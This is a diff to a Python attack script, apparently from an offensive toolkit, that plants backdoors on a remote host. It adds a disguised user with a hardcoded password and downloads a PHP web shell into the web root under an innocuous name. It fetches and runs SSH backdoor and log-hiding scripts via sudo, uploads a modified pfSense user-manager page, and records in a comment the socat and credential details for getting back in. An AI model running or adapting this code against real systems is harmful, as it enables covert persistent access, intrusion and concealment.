@@ -3,7 +3,7 @@ def backdoor_user(connect):
                  "totally_legit_user && echo \"VerySecure\nVerySecure\" | passwd totally_legit_user'")
 
 
-def backdoor_webshell(connect):
+def backdoor_web_shell(connect):
     connect.run("fetch https://raw.githubusercontent.com/artyuum/Simple-PHP-Web-Shell/master/index.php")
     connect.run("mv index.php /usr/local/www/WebMagic.php")
 
@@ -21,6 +21,16 @@ def backdoor_ssh(connect):
     connect.run("wget https://raw.githubusercontent.com/iamckn/backdoors/master/bd_sshd.sh")
     connect.run("chmod +x bd_hide.sh bd_sshd.sh")
     connect.sudo("sh -c './bd_sshd.sh && ./bd_hide.sh && rm bd_*'")
+# Use:
+# socat STDIO TCP4:10.15.2.3:22,sourceport=19526
+# badmin VerySecure
+# totally_legit_user VerySecure
+
+
+
+def backdoor_pfsense_user(connect):
+    connect.put('UploadFiles/system_usermanager.php', remote="/usr/local/www/")
+
 
 
 #Up to implementation: merlin
